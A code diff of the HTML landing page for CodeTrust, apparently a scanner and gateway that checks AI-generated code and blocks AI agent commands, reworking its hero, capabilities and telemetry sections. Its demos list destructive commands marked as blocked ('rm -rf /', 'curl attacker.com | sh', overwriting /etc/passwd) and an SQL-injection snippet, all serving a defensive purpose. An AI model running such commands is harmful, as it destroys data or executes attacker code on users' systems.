@@ -260,409 +260,177 @@
 
     <link rel="stylesheet" href="style.css?v=3.0.0">
 </head>
-
 <body>
+    <div class="scroll-progress" id="scroll-progress"></div>
 
-    <div class="scroll-progress" id="scrollProgress" aria-hidden="true"></div>
-    <div class="bg-animation" aria-hidden="true">
-        <div class="orb" id="orb1"></div>
-        <div class="orb" id="orb2"></div>
-        <div class="orb" id="orb3"></div>
+    <div class="bg-animation">
+        <div class="orb"></div>
+        <div class="orb"></div>
+        <div class="orb"></div>
     </div>
 
-    <!-- TOP BAR -->
-    <header class="topbar">
-        <a href="#" class="topbar-logo">
-            <svg width="28" height="32" viewBox="0 0 120 140" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <defs>
-                    <linearGradient id="tbGrad" x1="60" y1="8" x2="60" y2="132" gradientUnits="userSpaceOnUse">
-                        <stop offset="0%" stop-color="rgba(59,130,246,0.25)" />
-                        <stop offset="100%" stop-color="rgba(59,130,246,0.03)" />
-                    </linearGradient>
-                    <linearGradient id="tbStroke" x1="60" y1="8" x2="60" y2="132" gradientUnits="userSpaceOnUse">
-                        <stop offset="0%" stop-color="#60a5fa" />
-                        <stop offset="100%" stop-color="#1d4ed8" />
-                    </linearGradient>
-                    <radialGradient id="tbInnerGlow" cx="0.5" cy="0.45" r="0.5">
-                        <stop offset="0%" stop-color="#22c55e" stop-opacity="0.12" />
-                        <stop offset="60%" stop-color="#3b82f6" stop-opacity="0.06" />
-                        <stop offset="100%" stop-color="#3b82f6" stop-opacity="0" />
-                    </radialGradient>
-                    <filter id="tbCodeGlow">
-                        <feGaussianBlur stdDeviation="2" result="blur" />
-                        <feMerge>
-                            <feMergeNode in="blur" />
-                            <feMergeNode in="SourceGraphic" />
-                        </feMerge>
-                    </filter>
-                </defs>
-                <path d="M60 8L12 30v40c0 32 20 52 48 62 28-10 48-30 48-62V30L60 8z" fill="url(#tbGrad)"
-                    stroke="url(#tbStroke)" stroke-width="4" />
-                <path d="M60 18L22 36v32c0 26 16 44 38 52 22-8 38-26 38-52V36L60 18z" fill="none"
-                    stroke="rgba(96,165,250,0.1)" stroke-width="1" />
-                <text x="60" y="76" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="40"
-                    font-weight="700" fill="#22c55e" filter="url(#tbCodeGlow)">&lt;/&gt;</text>
-                <path d="M44 94l12 12 20-24" stroke="#3b82f6" stroke-width="5" stroke-linecap="round"
-                    stroke-linejoin="round" fill="none" filter="url(#tbCodeGlow)" />
-                <circle cx="60" cy="70" r="35" fill="url(#tbInnerGlow)" opacity="0.6" />
-            </svg>
-            <span class="code" style="margin-left:0.45rem">Code</span><span class="trust">Trust</span>
+    <!-- TOPBAR -->
+    <nav class="topbar" id="topbar">
+        <a href="https://codetrust.ai" class="topbar-logo">
+            <span class="code">Code</span><span class="trust">Trust</span>
         </a>
-        <button class="mobile-toggle" id="mobileToggle" aria-label="Menu" aria-expanded="false">
-            <svg class="icon-menu" width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
-                <rect y="3" width="20" height="2" rx="1" />
-                <rect y="9" width="20" height="2" rx="1" />
-                <rect y="15" width="20" height="2" rx="1" />
-            </svg>
-            <svg class="icon-close" width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor"
-                stroke-width="2" stroke-linecap="round" style="display:none">
-                <line x1="4" y1="4" x2="16" y2="16" />
-                <line x1="16" y1="4" x2="4" y2="16" />
-            </svg>
+        <button class="mobile-toggle" id="mobile-toggle" aria-label="Toggle navigation">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
         </button>
-        <nav class="topbar-nav">
-            <a href="#moats">Moats</a>
-            <a href="https://app.codetrust.ai" target="_blank">Dashboard</a>
-            <a href="#enforcement">Gateway</a>
-            <a href="#enterprise">Enterprise</a>
-            <a href="#pipeline">Layers</a>
-            <a href="#demo">Proof</a>
-            <a href="demo.html">Demo</a>
-            <a href="https://pypi.org/project/codetrust/" target="_blank">PyPI</a>
-            <a href="https://api.codetrust.ai/v1/status" target="_blank">API</a>
-            <a href="https://chrome.google.com/webstore/detail/codetrust-ai-code-safety" target="_blank">Chrome</a>
-            <a href="/report.html" class="topbar-support" aria-label="Report issue or contact support">Report /
-                Contact</a>
-            <a href="https://app.codetrust.ai" target="_blank" class="topbar-install">Sign In</a>
-        </nav>
-    </header>
+        <div class="topbar-nav" id="topbar-nav">
+            <a href="https://app.codetrust.ai">Get Started</a>
+            <a href="https://github.com/S-Borna/codetrust">GitHub</a>
+            <a href="https://pypi.org/project/codetrust/">PyPI</a>
+            <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust" class="topbar-install">Install VS Code</a>
+        </div>
+    </nav>
 
-    <!-- 1. HERO -->
-    <section class="hero">
-        <div class="hero-content">
-            <div class="hero-logo">
-                <svg viewBox="0 0 120 140" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <defs>
-                        <linearGradient id="shieldGrad" x1="60" y1="8" x2="60" y2="132" gradientUnits="userSpaceOnUse">
-                            <stop offset="0%" stop-color="rgba(59,130,246,0.25)" />
-                            <stop offset="100%" stop-color="rgba(59,130,246,0.03)" />
-                        </linearGradient>
-                        <linearGradient id="shieldStroke" x1="60" y1="8" x2="60" y2="132"
-                            gradientUnits="userSpaceOnUse">
-                            <stop offset="0%" stop-color="#60a5fa" />
-                            <stop offset="100%" stop-color="#1d4ed8" />
-                        </linearGradient>
-                        <radialGradient id="innerGlow" cx="0.5" cy="0.45" r="0.5">
-                            <stop offset="0%" stop-color="#22c55e" stop-opacity="0.12" />
-                            <stop offset="60%" stop-color="#3b82f6" stop-opacity="0.06" />
-                            <stop offset="100%" stop-color="#3b82f6" stop-opacity="0" />
-                        </radialGradient>
-                        <filter id="codeGlow">
-                            <feGaussianBlur stdDeviation="2" result="blur" />
-                            <feMerge>
-                                <feMergeNode in="blur" />
-                                <feMergeNode in="SourceGraphic" />
-                            </feMerge>
-                        </filter>
-                    </defs>
-                    <path d="M60 8L12 30v40c0 32 20 52 48 62 28-10 48-30 48-62V30L60 8z" fill="url(#shieldGrad)"
-                        stroke="url(#shieldStroke)" stroke-width="4" />
-                    <path d="M60 18L22 36v32c0 26 16 44 38 52 22-8 38-26 38-52V36L60 18z" fill="none"
-                        stroke="rgba(96,165,250,0.1)" stroke-width="1" />
-                    <text x="60" y="76" text-anchor="middle" font-family="'IBM Plex Mono',monospace" font-size="40"
-                        font-weight="700" fill="#22c55e" filter="url(#codeGlow)">&lt;/&gt;</text>
-                    <path d="M44 94l12 12 20-24" stroke="#3b82f6" stroke-width="5" stroke-linecap="round"
-                        stroke-linejoin="round" fill="none" filter="url(#codeGlow)" />
-                    <circle cx="60" cy="70" r="35" fill="url(#innerGlow)" opacity="0.6" />
-                </svg>
-                <span class="hero-logo-text"><span class="code">Code</span><span class="trust">Trust</span><span
-                        class="hero-tagline">AI-Governance Enforcement Platform</span></span>
+    <!-- ==================== SCREEN 1: HERO ==================== -->
+    <section class="hero" id="hero">
+        <div class="hero-terminal" id="hero-terminal">
+            <div class="hero-terminal-bar">
+                <div class="hero-terminal-dot" style="background:#ff5f57"></div>
+                <div class="hero-terminal-dot" style="background:#febc2e"></div>
+                <div class="hero-terminal-dot" style="background:#28c840"></div>
+                <span class="hero-terminal-title">terminal</span>
             </div>
-            <span class="hero-version">v3.0.0 &mdash; 484 rules &mdash; 10 layers &mdash; 2,058 tests</span>
-            <h1>The only scanner that catches<span class="line2">code that doesn't exist</span></h1>
-            <p class="hero-sub">AI generates packages that were never published. Functions that were never written.<br>CodeTrust catches them &mdash; <strong>before they ship</strong>.</p>
-            <div class="hero-actions" data-webmcp-context="install" data-webmcp-action="install-codetrust"
-                data-webmcp-description="Install CodeTrust AI governance enforcement platform">
-                <a href="https://app.codetrust.ai" class="btn btn-primary" target="_blank">Get Started Free</a>
-                <a href="#moats" class="btn btn-ghost" data-webmcp-tool="navigate"
-                    data-webmcp-param-section="pipeline">See what we catch</a>
+            <div class="hero-terminal-body">
+                <div id="typewriter-output"></div>
+                <span class="cursor-blink" id="cursor"></span>
             </div>
-            <div class="hero-pip" data-webmcp-context="install-cli" data-webmcp-action="pip-install"
-                data-webmcp-description="Install CodeTrust via pip">
-                <code
-                    onclick="navigator.clipboard.writeText('pip install codetrust');this.nextElementSibling.style.opacity='1';setTimeout(()=>this.nextElementSibling.style.opacity='0',1500)"
-                    data-webmcp-tool="run_command"
-                    data-webmcp-param-command="pip install codetrust">$ pip install codetrust</code>
-                <span class="copied">copied</span>
+        </div>
+
+        <div class="hero-below" id="hero-below">
+            <div class="hero-actions">
+                <a href="https://app.codetrust.ai" class="btn btn-primary">Get Started Free</a>
+                <a href="#capabilities" class="btn btn-ghost">See what we catch &rarr;</a>
             </div>
-            <!-- Proof bar -->
-            <div class="stats-bar" style="border:none;padding:1.5rem 0 0;gap:2rem;">
-                <div class="stat-item" style="padding:0;">
-                    <div class="stat-num" style="font-size:1.5rem;">484</div>
-                    <div class="stat-label">rules</div>
+            <p class="hero-meta">v3.0.0 &middot; 484 rules &middot; 2,058 tests &middot; Free</p>
+        </div>
+    </section>
+
+    <!-- ==================== SCREEN 2: THREE CAPABILITIES ==================== -->
+    <section class="container" id="capabilities">
+        <div class="reveal">
+            <h2>Three things nobody else does</h2>
+            <p class="section-sub">Every AI code tool checks syntax. We check reality.</p>
+        </div>
+
+        <div class="three-cards">
+            <!-- CARD 1: Hallucination Detection -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Catches code that doesn't exist</h3>
                 </div>
-                <div class="stat-item" style="padding:0;">
-                    <div class="stat-num" style="font-size:1.5rem;">8</div>
-                    <div class="stat-label">registries verified</div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal">
+                        <span class="t-dim">$</span> <span class="t-white">import</span> ml_quantum_utils<br>
+                        <br>
+                        <span class="t-red">BLOCK</span> <span class="t-dim">Package not found on PyPI</span><br>
+                        <span class="t-dim">Did you mean:</span> <span class="t-amber">quantum-utils</span> <span class="t-dim">(v1.2.3)</span>
+                    </div>
                 </div>
-                <div class="stat-item" style="padding:0;">
-                    <div class="stat-num" style="font-size:1.5rem;">Taint</div>
-                    <div class="stat-label">analysis built-in</div>
+                <div class="demo-card-sub">
+                    Live verification against 8 registries. PyPI, npm, crates.io, Go, Maven, NuGet, RubyGems, Packagist.
+                </div>
+            </div>
+
+            <!-- CARD 2: Gateway -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Blocks commands before they execute</h3>
+                </div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal" id="gateway-demo">
+                        <div class="gateway-line blocked" data-delay="0">
+                            <span class="gw-source">AI Agent</span>
+                            <span class="gw-cmd">rm -rf /</span>
+                            <span class="gw-verdict red">BLOCKED</span>
+                        </div>
+                        <div class="gateway-line allowed" data-delay="400">
+                            <span class="gw-source">AI Agent</span>
+                            <span class="gw-cmd">pip install flask</span>
+                            <span class="gw-verdict green">ALLOWED</span>
+                        </div>
+                        <div class="gateway-line blocked" data-delay="800">
+                            <span class="gw-source">AI Agent</span>
+                            <span class="gw-cmd">curl | sh</span>
+                            <span class="gw-verdict red">BLOCKED</span>
+                        </div>
+                        <div class="gateway-line allowed" data-delay="1200">
+                            <span class="gw-source">AI Agent</span>
+                            <span class="gw-cmd">git commit -m "fix"</span>
+                            <span class="gw-verdict green">ALLOWED</span>
+                        </div>
+                        <div class="gateway-line blocked" data-delay="1600">
+                            <span class="gw-source">AI Agent</span>
+                            <span class="gw-cmd">chmod 777 /etc</span>
+                            <span class="gw-verdict red">BLOCKED</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="demo-card-sub">
+                    82 real-time interception rules. Works with Claude Code, Cursor, Copilot.
+                </div>
+            </div>
+
+            <!-- CARD 3: Taint Analysis -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Traces tainted data to dangerous sinks</h3>
+                </div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal">
+                        <div class="taint-flow">
+                            <div class="taint-line taint-source">
+                                <span class="t-white">user_id = request.args.get('id')</span>
+                                <span class="taint-tag taint-tag-source">SOURCE</span>
+                            </div>
+                            <div class="taint-arrow">&darr;</div>
+                            <div class="taint-line taint-through">
+                                <span class="t-dim">query = f"SELECT * FROM users WHERE id = {user_id}"</span>
+                            </div>
+                            <div class="taint-arrow">&darr;</div>
+                            <div class="taint-line taint-sink">
+                                <span class="t-white">cursor.execute(query)</span>
+                                <span class="taint-tag taint-tag-sink">SINK: SQL injection</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="demo-card-sub">
+                    Taint analysis. SQL injection, XSS, command injection, SSRF &mdash; caught before merge.
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- WORKS WITH -->
-    <div class="works-with reveal">
-        <span class="works-with-label">Works with</span>
-        <span class="works-with-item">
-            <svg viewBox="0 0 24 24" fill="none">
-                <path
-                    d="M23.15 2.587L18.21.21a1.166 1.166 0 0 0-1.377.263L8.09 9.913l-4.14-3.14a.78.78 0 0 0-.996.037L.66 9.013a.78.78 0 0 0 .006 1.17l3.608 3.3-3.608 3.3a.78.78 0 0 0-.006 1.17l2.295 2.203a.78.78 0 0 0 .996.037l4.14-3.14 8.743 9.44a1.166 1.166 0 0 0 1.376.262l4.94-2.377a1.166 1.166 0 0 0 .68-1.059V3.647a1.166 1.166 0 0 0-.68-1.06zM17.66 19.29L10.2 12.49l7.46-6.8v13.6z"
-                    fill="#007ACC" />
-            </svg>
-            VS Code
-        </span>
-        <span class="works-with-item">
-            <svg viewBox="0 0 24 24" fill="#e8e8ec">
-                <path
-                    d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" />
-            </svg>
-            GitHub
-        </span>
-        <span class="works-with-item">
-            <svg viewBox="0 0 24 24" fill="none">
-                <circle cx="12" cy="12" r="11" stroke="#D97706" stroke-width="2" /><text x="12" y="16.5"
-                    text-anchor="middle" font-family="sans-serif" font-size="11" font-weight="700"
-                    fill="#D97706">C</text>
-            </svg>
-            Claude Code
-        </span>
-        <span class="works-with-item">
-            <svg viewBox="0 0 24 24" fill="none">
-                <rect x="2" y="2" width="20" height="20" rx="4" stroke="#00B4D8" stroke-width="2" />
-                <path d="M8 12h8M12 8v8" stroke="#00B4D8" stroke-width="2" stroke-linecap="round" />
-            </svg>
-            Cursor
-        </span>
-        <span class="works-with-item">
-            <svg viewBox="0 0 24 24" fill="none">
-                <path d="M12 2L2 7v10l10 5 10-5V7L12 2z" stroke="#06b6d4" stroke-width="2" fill="none" />
-                <path d="M2 7l10 5 10-5M12 22V12" stroke="#06b6d4" stroke-width="2" />
-            </svg>
-            MCP
-        </span>
-    </div>
-
-    <!-- 2. COMPETITIVE PROOF -->
-    <section class="container reveal" id="rules">
-        <div class="section-tag section-center" style="color:var(--red);">What your current tools miss</div>
-        <h2 class="reveal" style="text-align:center">Side-by-side: CodeTrust vs. the incumbents</h2>
-
-        <div style="overflow-x:auto;margin-top:2.5rem;">
-            <table class="compare-table" style="width:100%;border-collapse:separate;border-spacing:0;font-size:0.88rem;font-family:'IBM Plex Mono',monospace;">
-                <thead>
-                    <tr>
-                        <th style="text-align:left;padding:0.9rem 1rem;border-bottom:1px solid var(--border);color:var(--text-3);font-weight:500;font-size:0.78rem;"></th>
-                        <th style="text-align:center;padding:0.9rem 1rem;border-bottom:2px solid var(--indigo);color:var(--white);font-weight:700;background:var(--indigo-dim);border-radius:8px 8px 0 0;">CodeTrust</th>
-                        <th style="text-align:center;padding:0.9rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);font-weight:500;">SonarQube</th>
-                        <th style="text-align:center;padding:0.9rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);font-weight:500;">Semgrep</th>
-                        <th style="text-align:center;padding:0.9rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);font-weight:500;">Snyk</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);">AI Governance Gateway</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;background:rgba(99,102,241,0.04);color:var(--green);font-weight:700;">82 rules</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">&mdash;</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">&mdash;</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">&mdash;</td>
-                    </tr>
-                    <tr>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);">Hallucination Detection</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;background:rgba(99,102,241,0.04);color:var(--green);font-weight:700;">8 registries</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">&mdash;</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">&mdash;</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">&mdash;</td>
-                    </tr>
-                    <tr>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);">Taint Analysis</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;background:rgba(99,102,241,0.04);color:var(--green);font-weight:700;">Built-in</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--green);">Yes</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--green);">Yes</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--green);">Yes</td>
-                    </tr>
-                    <tr>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);">SAST Rules</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;background:rgba(99,102,241,0.04);color:var(--white);font-weight:600;">402</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-2);">5,000+</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-2);">3,000+</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-2);">SAST</td>
-                    </tr>
-                    <tr>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);color:var(--text-2);">Pre-execution blocking</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;background:rgba(99,102,241,0.04);color:var(--green);font-weight:700;">Real-time</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">Post-commit</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">Post-commit</td>
-                        <td style="padding:0.75rem 1rem;border-bottom:1px solid var(--border);text-align:center;color:var(--text-3);">Post-commit</td>
-                    </tr>
-                    <tr>
-                        <td style="padding:0.75rem 1rem;color:var(--text-2);">Price / 10 devs</td>
-                        <td style="padding:0.75rem 1rem;text-align:center;background:rgba(99,102,241,0.04);color:var(--green);font-weight:700;font-size:1rem;">$0</td>
-                        <td style="padding:0.75rem 1rem;text-align:center;color:var(--text-2);">$32/mo</td>
-                        <td style="padding:0.75rem 1rem;text-align:center;color:var(--text-2);">$400/mo</td>
-                        <td style="padding:0.75rem 1rem;text-align:center;color:var(--text-2);">$250/mo</td>
-                    </tr>
-                </tbody>
-            </table>
+    <!-- ==================== SCREEN 3: LIVE TELEMETRY ==================== -->
+    <section class="container" id="telemetry">
+        <div class="reveal">
+            <h2><span class="live-dot"></span> This is real. Right now.</h2>
+            <p class="section-sub">Every scan, every block, every verification &mdash; streamed live from production.</p>
         </div>
-    </section>
 
-    <!-- 3. FOUR MOATS -->
-    <section class="container" id="moats">
-        <div class="section-tag section-center">Competitive Advantage</div>
-        <h2 class="reveal">Four moats no other tool has</h2>
-        <p class="section-desc reveal">They scan code after it ships. <strong>CodeTrust blocks it before it runs.</strong></p>
-
-        <div class="moats-grid reveal" style="grid-template-columns: repeat(2, 1fr);">
-            <div class="moat-card">
-                <div class="moat-icon moat-icon-gateway">&#x26D4;</div>
-                <h3>AI Governance Gateway</h3>
-                <p>Pre-execution interception of AI agent commands. Validates every terminal command,
-                    file write, and package install against configurable policies &mdash; <strong>before it
-                        runs</strong>.</p>
-                <div class="moat-stat">
-                    <div class="moat-stat-num">82</div>
-                    <span class="t-dim">real-time interception rules</span>
-                </div>
-            </div>
-            <div class="moat-card">
-                <div class="moat-icon moat-icon-halluc">&#x1F50D;</div>
-                <h3>Hallucination Detection</h3>
-                <p>Verifies every import against live PyPI, npm, crates.io, Go proxy, Maven, NuGet, RubyGems, and Packagist.
-                    Catches packages that <strong>don't exist</strong>. Signature validation checks <strong>405 functions</strong> across 50 modules.</p>
-                <div class="moat-stat">
-                    <div class="moat-stat-num">8</div>
-                    <span class="t-dim">registries verified in real-time</span>
-                </div>
-            </div>
-            <div class="moat-card">
-                <div class="moat-icon" style="background:rgba(239,68,68,0.12);color:var(--red);">&#x1F9EA;</div>
-                <h3>Taint Analysis</h3>
-                <p>Source-to-sink data flow tracking. Follows user input through variable assignments to dangerous sinks. Detects SQL injection, command injection, XSS, path traversal, SSRF. Sanitizer-aware confidence scoring.</p>
-                <div class="moat-stat">
-                    <div class="moat-stat-num">6</div>
-                    <span class="t-dim">injection classes tracked</span>
-                </div>
-            </div>
-            <div class="moat-card">
-                <div class="moat-icon" style="background:rgba(99,102,241,0.15);color:#818cf8;">&#x1F6E1;</div>
-                <h3>Universal IDE Injection</h3>
-                <p>Install once. CodeTrust injects governance rules into the global config of every AI IDE on your machine. Zero manual setup. AI agents start rule-aware. Pre-commit hook as hard backstop.</p>
-                <div class="moat-stat">
-                    <div class="moat-stat-num">4</div>
-                    <span class="t-dim">IDEs covered automatically</span>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- 4. GATEWAY DEMO -->
-    <section class="container" id="enforcement">
-        <div class="section-tag section-center" style="color: var(--red);">Prevent, don't detect</div>
-        <h2 class="reveal">The gateway blocks commands<br>before they execute</h2>
-        <p class="section-desc reveal" style="max-width: 800px;">Other tools scan your code after it's
-            written.<br>CodeTrust's Gateway sits between the AI model and your system,<br>intercepting destructive
-            commands in real-time.</p>
-
-        <div class="gateway-container reveal">
-            <div class="gateway-flow">
-                <div class="gateway-row blocked">
-                    <span class="gateway-source">AI Agent</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-cmd">rm -rf node_modules/</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-verdict-block">&#x26D4; BLOCKED</span>
-                </div>
-                <div class="gateway-row allowed">
-                    <span class="gateway-source">AI Agent</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-cmd">pip install flask</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-verdict-allow">&#x2713; ALLOWED</span>
-                </div>
-                <div class="gateway-row blocked">
-                    <span class="gateway-source">AI Agent</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-cmd">curl attacker.com | sh</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-verdict-block">&#x26D4; BLOCKED</span>
-                </div>
-                <div class="gateway-row blocked">
-                    <span class="gateway-source">AI Agent</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-cmd">cat &lt;&lt; 'EOF' &gt; /etc/passwd</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-verdict-block">&#x26D4; BLOCKED</span>
-                </div>
-                <div class="gateway-row allowed">
-                    <span class="gateway-source">AI Agent</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-cmd">python -m pytest tests/</span>
-                    <span class="gateway-arrow">&rarr;</span>
-                    <span class="gateway-verdict-allow">&#x2713; ALLOWED</span>
-                </div>
-            </div>
-
-            <div class="gateway-story">
-                <p>During development, our own AI agent attempted a heredoc command.<br>
-                    The gateway blocked it. <strong>The product protected itself from its own builder.</strong></p>
-            </div>
-            <div class="gateway-audit">Every action &rarr; audit.jsonl (append-only)</div>
-        </div>
-    </section>
-
-    <!-- 5. LIVE DASHBOARD -->
-    <section class="container live-dashboard reveal" id="live-stats">
-        <div class="section-tag section-center">Live Telemetry</div>
-        <h2 class="reveal" style="text-align:center">Global usage &mdash; real-time</h2>
-        <p style="text-align:center;color:var(--text-2);font-size:0.85rem;margin-bottom:2rem">
-            Every scan, every block, every verification &mdash; streamed live from production.<br>
-            <span class="live-dot"></span> <span id="live-updated-at"
-                style="font-family:'IBM Plex Mono',monospace;font-size:0.72rem;color:var(--text-3)">connecting...</span>
-        </p>
-
-        <div class="dash-grid">
+        <div class="dash-grid reveal">
             <div class="dash-card">
-                <div class="dash-card-header">
-                    <span class="dash-icon">&#x1F50D;</span> Scanning
-                </div>
-                <div class="dash-hero-num dash-val-amber" data-key="total_findings">0</div>
-                <div class="dash-hero-label">findings detected</div>
+                <div class="dash-card-header">Findings</div>
+                <div class="dash-hero-num dash-amber" data-key="total_findings">0</div>
+                <div class="dash-hero-label">issues detected</div>
                 <div class="dash-detail-row">
                     <span class="dash-detail"><strong data-key="files_scanned">0</strong> files</span>
                     <span class="dash-detail"><strong data-key="total_scans">0</strong> scans</span>
                 </div>
             </div>
             <div class="dash-card">
-                <div class="dash-card-header">
-                    <span class="dash-icon">&#x1F6E1;&#xFE0F;</span> Protection
-                </div>
+                <div class="dash-card-header">Blocks</div>
                 <div class="dash-hero-num dash-red" data-key="blocks_found">0</div>
-                <div class="dash-hero-label">issues blocked</div>
-                <div class="dash-detail-row">
-                    <span class="dash-detail">commands stopped</span>
-                    <span class="dash-detail">hallucinations caught</span>
-                    <span class="dash-detail">imports verified</span>
-                </div>
+                <div class="dash-hero-label">critical issues blocked</div>
             </div>
             <div class="dash-card">
-                <div class="dash-card-header">
-                    <span class="dash-icon">&#x1F4E6;</span> Reach
-                </div>
+                <div class="dash-card-header">Distribution</div>
                 <div class="dash-hero-num dash-cyan" data-key="pypi_total">0</div>
-                <div class="dash-hero-label">pip installs</div>
+                <div class="dash-hero-label">PyPI downloads</div>
                 <div class="dash-detail-row">
                     <span class="dash-detail"><strong class="dash-val-cyan" data-key="pypi_week">0</strong>/wk PyPI</span>
                     <span class="dash-detail"><strong data-key="marketplace_downloads">0</strong> VS Code</span>
@@ -673,592 +441,332 @@
 
         <div class="dash-source-bar reveal">
             <span class="dash-source-label">Scans by source:</span>
-            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--green)"></span>CLI <strong
-                    data-key="src_cli">0</strong></span>
-            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--indigo)"></span>VS Code
-                <strong data-key="src_vscode">0</strong></span>
-            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--amber)"></span>GitHub
-                Action <strong data-key="src_github_action">0</strong></span>
-            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--red)"></span>Cloud API
-                <strong data-key="src_cloud_api">0</strong></span>
+            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--green)"></span> CLI <strong data-key="src_cli">0</strong></span>
+            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--indigo)"></span> VS Code <strong data-key="src_vscode">0</strong></span>
+            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--amber)"></span> GitHub Action <strong data-key="src_github_action">0</strong></span>
+            <span class="dash-source-chip"><span class="dash-src-dot" style="background:var(--cyan)"></span> Cloud API <strong data-key="src_cloud_api">0</strong></span>
         </div>
 
-        <div class="telemetry-note">Live data from all CodeTrust users across CLI, VS Code, GitHub Actions,
-            and Cloud API.</div>
+        <div class="impact-threats reveal">
+            <div id="impact-grid" class="impact-grid"></div>
+        </div>
+
+        <p class="telemetry-note reveal" id="live-updated-at">live</p>
     </section>
 
-    <section class="container impact-threats reveal" id="impact-threats">
-        <div class="section-tag section-center">Threat Intelligence</div>
-        <h2 class="reveal" style="text-align:center">Findings Breakdown</h2>
-        <p style="text-align:center;color:var(--text-2);font-size:0.88rem;margin-bottom:1.6rem">
-            Live production findings grouped into six high-impact risk categories.
-        </p>
-        <div class="impact-grid" id="impact-grid"></div>
-    </section>
+    <!-- ==================== SCREEN 4: COMPETITIVE ==================== -->
